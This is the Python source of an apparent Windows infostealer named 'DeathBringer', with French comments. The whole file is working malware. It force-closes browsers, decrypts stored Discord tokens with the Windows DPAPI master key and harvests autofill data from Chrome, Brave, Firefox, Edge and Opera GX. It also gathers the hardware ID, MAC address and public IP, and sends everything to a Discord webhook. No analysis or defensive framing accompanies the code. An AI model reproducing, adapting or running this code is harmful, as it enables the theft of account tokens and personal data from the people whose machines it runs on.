
import os

try:
    import subprocess
    import sys
except:
    os.system("pip install subprocess")
    os.system("pip install sys")

modules = {
    'requests': 'requests',
    'wmi': 'wmi',
    'psutil': 'psutil',
    'discord_webhook': 'discord-webhook',
    'Crypto.Cipher': 'pycryptodome',
    'win32crypt': 'pypiwin32'
}

def install_module(module_name):
    print(f"Installation de {module_name}...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

def check_and_install_modules():
    for module, package in modules.items():
        try:
            __import__(module)
        except ImportError:
            install_module(package)

user = os.path.expanduser("~")
pseudo = os.getlogin()

webHOOK = f"{webhook_url}"
webhooks = [f"{webHOOK}", ]
webhook = webHOOK
wbh = webHOOK
webhook_url = webHOOK


def closenav():
    navigateurs = [
        'amigo.exe', 'torch.exe', 'kometa.exe', 'orbitum.exe', 'cent-browser.exe', '7star.exe',
        'sputnik.exe', 'vivaldi.exe', 'google-chrome-sxs.exe', 'google-chrome.exe', 'chrome.exe',
        'epic-privacy-browser.exe', 'msedge.exe', 'uran.exe', 'yandex.exe',
        'brave.exe', 'iridium.exe', 'firefox.exe', "opera.exe", "operagx.exe", "launcher.exe"
    ]

    for process in psutil.process_iter():
        try:
            if any(navigateur in process.name().lower() for navigateur in navigateurs):
                process.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
            
class DiscordToken:
    def __init__(self, webhooks):
        for webhook in webhooks:
            UploadTokens(webhook).upload()

class ExtractTokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens, self.uids = [], []
        self.extract()

    def extract(self) -> None:
        discord_paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
        }

        for name, path in discord_paths.items():
            if not os.path.exists(path):
                continue

            path = path.rstrip("\\")

            _discord = name.replace(" ", "").lower()
            if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                continue

            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(self.regexp_enc, line):
                        token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
                                                 self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))

                        if self.validate_token(token):
                            uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                            if uid not in self.uids:
                                self.tokens.append(token)
                                self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        return r.status_code == 200

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

class UploadTokens:
    def __init__(self, webhook: str):
        self.tokens = ExtractTokens().tokens
        self.webhook_url = webhook

    def upload(self):
        if not self.tokens:
            return

        for token in self.tokens:
            user = requests.get(
                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"


            embed = DiscordEmbed(title=f"`💀` ```{username}``` (**{user_id}**)", color='000000')
            embed.set_thumbnail(url=avatar)
            embed.add_embed_field(name="`💀` Token:",value=f"```{token}```\u200b", inline=False)
            embed.add_embed_field(name="`💀` Email:",value=f"`{email if email != None else 'None'}`", inline=True)
            embed.add_embed_field(name="`💀` Phone:",value=f"`{phone if phone != None else 'None'}`", inline=True)
        
            embed.set_footer(text='Heure', icon_url='https://i.imgur.com/RG6FGZL.jpeg')
            webhook = DiscordWebhook(url=self.webhook_url, username="💀 DeathBringer", avatar_url="https://i.imgur.com/RG6FGZL.jpeg")
            webhook.add_embed(embed)
            embed.set_timestamp()
            webhook.execute()

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        if interface == "Wi-Fi":
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    return mac

def get_user_info():
    try:
        user_name = os.getenv('USERNAME') or os.getenv('USER') or "Non disponible"
        
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
        mail_key = "Mail"
        buffer_size = 260 

        mail_value = ctypes.create_unicode_buffer(buffer_size)
        if ctypes.windll.kernel32.GetEnvironmentVariableW(mail_key, mail_value, buffer_size) == 0:
            email = "Non disponible"
        else:
            email = mail_value.value
    except Exception as e:
        user_name = "Non disponible"
        email = "Non disponible"

def machineinfo(webHOOK):
        
    mem = psutil.virtual_memory()

    c = wmi.WMI()
    GPUm = ""
    for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()

    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    
    reqip = requests.get("https://api.ipify.org/?format=json").json()
              
    mac = get_mac_address()

    hostname = socket.gethostname()

    webhook = DiscordWebhook(url=webHOOK, username="💀 DeathBringer", avatar_url="https://i.imgur.com/RG6FGZL.jpeg")

    embed = DiscordEmbed(title='**`💀` Machine Info**: ', color='000000')
    embed.add_embed_field("PC:", value=f"`💀 {hostname}`", inline=False)
    embed.add_embed_field("Utilisateur:", value=f"`💀 {pseudo}`", inline=False)

    embed.add_embed_field("OS:", value=f"`💀 {platform.platform()}`", inline=False)
    embed.add_embed_field("RAM:", value=f"`💀 {mem.total / 1024**3} GB`", inline=False)
    embed.add_embed_field("GPU:", value=f"`💀 {GPUm}`", inline=False)
    embed.add_embed_field("CPU:", value=f"`💀 {platform.processor()}`", inline=False)
    embed.add_embed_field("HWID:", value=f"`💀 {current_machine_id}`", inline=False)
    embed.add_embed_field("MAC:", value=f"`💀 {mac}`", inline=False)
    embed.add_embed_field("IP:", value=f"`💀 {reqip['ip']}`", inline=False)

    embed.set_footer(text='Heure', icon_url='https://i.imgur.com/RG6FGZL.jpeg')
    embed.set_timestamp()

    webhook.add_embed(embed)
    webhook.execute()

# AutoFill

def owCrp(webhook_url):
    def get_browser_paths():
        user = os.path.expanduser("~")
        return [
            os.path.join(user, "AppData", "Local", "Google", "Chrome", "User Data"),
            os.path.join(user, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            os.path.join(user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
            os.path.join(user, "AppData", "Local", "Microsoft", "Edge", "User Data"),
            os.path.join(user, "AppData", "Roaming", "Opera Software", "Opera GX Stable") #opera
        ]

    def get_autofills(browser_paths):
        autofills = {}

        for browser_path in browser_paths:
            autofills[get_browser_name(browser_path)] = extract_autofills(browser_path)

        return autofills
    
    def extract_autofills_from_opera(db_file):
        autofills = []

        try:
            with sqlite3.connect(db_file) as db:
                cursor = db.cursor()
                cursor.execute('SELECT field_name, value FROM autofill')
                for data in cursor.fetchall():
                    field_name = data[0].strip()
                    value = data[1].strip()

                    autofill_info = f"FIELD NAME: {field_name} | VALUE: {value}"
                    autofills.append(autofill_info)
        except sqlite3.Error as e:
            pass
        except Exception as e:
            pass

        return autofills

    def extract_autofills(browser_path):
        autofills = []

        for root, _, files in os.walk(browser_path):
            for file in files:
                if file.lower() == 'web data':
                    db_file = os.path.join(root, file)
                    autofills.extend(extract_autofills_from_db(db_file))
                elif file.lower() == 'formhistory.sqlite':
                    db_file = os.path.join(root, file)
                    autofills.extend(extract_formhistory_autofills(db_file))
                elif file.lower() == 'autofill.db':  # Ajout pour Opera GX
                    db_file = os.path.join(root, file)
                    autofills.extend(extract_autofills_from_opera(db_file))  # Appel de la fonction spécifique à Opera GX

        return autofills


    def extract_autofills_from_db(db_file):
        autofills = []

        try:
            with sqlite3.connect(db_file) as db:
                cursor = db.cursor()
                cursor.execute('SELECT name, value, count FROM autofill')
                for data in cursor.fetchall():
                    name = data[0].strip()
                    value = data[1].strip()
                    count = data[2]

                    autofill_info = f"NAME: {name} | DATA: {value}"
                    autofills.append(autofill_info)
        except sqlite3.Error as e:
            pass
        except Exception as e:
            pass

        return autofills

    def extract_formhistory_autofills(db_file):
        autofills = []

        try:
            with sqlite3.connect(db_file) as db:
                cursor = db.cursor()
                cursor.execute('SELECT fieldname, value FROM moz_formhistory')
                for data in cursor.fetchall():
                    fieldname = data[0].strip()
                    value = data[1].strip()

                    autofill_info = f"FIELDNAME: {fieldname} | DATA: {value}"
                    autofills.append(autofill_info)
        except sqlite3.Error as e:
            pass
        except Exception as e:
            pass

        return autofills

    def get_browser_name(browser_path):
        return os.path.basename(os.path.dirname(browser_path))

    def zip_files(autofills):
        try:
            zip_file_path = "autofills.zip"
            with zipfile.ZipFile(zip_file_path, 'w') as zipf:
                for browser_name, autofill_data in autofills.items():
                    if autofill_data:
                        header = " "*20 + "<< 💀 >> © DeathBringer © << 💀 >>\n\n•——————————————————————————————————————————————————————————————————————•\n\n"
                        footer = "\n\n•——————————————————————————————————————————————————————————————————————•"
                        autofill_info_str = header + '\n'.join(autofill_data) + footer
                        zipf.writestr(f"autofills_{browser_name}.txt", autofill_info_str)
            return zip_file_path
        except Exception as e:
            return None

    def send_webhook(zip_file_path):
        try:
            webhook = DiscordWebhook(url=webhook_url, username="💀 DeathBringer", avatar_url="https://i.imgur.com/RG6FGZL.jpeg")
            webhook.add_file(file=open(zip_file_path, "rb"), filename="autofills.zip")
            response = webhook.execute()
        except Exception as e:
            pass

    browser_paths = get_browser_paths()
    autofills = get_autofills(browser_paths)

    if autofills:
        zip_file_path = zip_files(autofills)
        if zip_file_path:
            send_webhook(zip_file_path)
            os.remove(zip_file_path)
        else:
            pass
    else:
        pass


if __name__ == "__main__":
    check_and_install_modules()
    import requests
    import wmi
    import psutil
    import platform
    import json
    from discord_webhook import DiscordWebhook, DiscordEmbed
    import socket
    import ctypes
    import zipfile
    import base64
    import sqlite3
    from Crypto.Cipher import AES
    from win32crypt import CryptUnprotectData
    import re
    import subprocess

    closenav()
    owCrp(webhook_url)
    DiscordToken(webhooks)
    machineinfo(webHOOK)